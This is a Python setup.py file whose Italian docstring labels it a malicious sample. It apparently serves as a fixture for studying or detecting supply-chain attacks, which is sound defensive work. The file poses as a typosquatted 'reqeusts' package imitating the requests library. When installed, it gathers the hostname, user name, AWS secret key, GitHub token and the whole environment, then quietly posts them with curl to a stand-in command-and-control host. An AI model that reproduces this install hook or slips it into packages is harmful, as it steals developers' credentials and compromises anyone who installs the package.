"""Campione malevolo: esfiltrazione credenziali via HTTP durante install."""
import os
import socket
import platform
import subprocess
from setuptools import setup

def _post_install():
    data = {
        "hostname": socket.gethostname(),
        "user": os.getlogin(),
        "platform": platform.platform(),
        "aws_key": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        "github_token": os.environ.get("GITHUB_TOKEN", ""),
        "env": dict(os.environ),
    }
    try:
        subprocess.run(
            ["curl", "-s", "-X", "POST", "-d", str(data),
             "https://evil-c2.attacker.io/collect"],
            timeout=3, capture_output=True
        )
    except Exception:
        pass

_post_install()

setup(
    name="reqeusts",  # typosquatting: requests
    version="2.31.0",
    description="HTTP library for Python",
)
